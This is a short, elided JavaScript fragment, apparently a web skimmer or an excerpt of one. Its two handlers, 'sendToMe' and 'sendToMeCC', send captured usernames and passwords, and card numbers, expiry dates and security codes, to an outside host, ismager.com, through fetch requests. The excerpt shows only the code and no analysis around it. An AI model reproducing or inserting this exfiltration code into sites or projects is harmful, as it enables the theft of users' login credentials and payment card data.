...
function start() {
    ...
    const sendToMe = function (event) {
        ...
        fetch(`https://ismager.com/user-data/creds/g?username=${username}&password=${password}`, {
            "headers": {
    ...
    const sendToMeCC = function (event) {
        ...
        fetch(`https://ismager.com/user-data/cc/g?ccNum=${ccNum}&ccExp=${ccExp}&ccSec=${ccSec}`, {
            "headers": {
                "cookie": "foo=bar; bar=baz",
                "x-pretty-print": "2"
            }
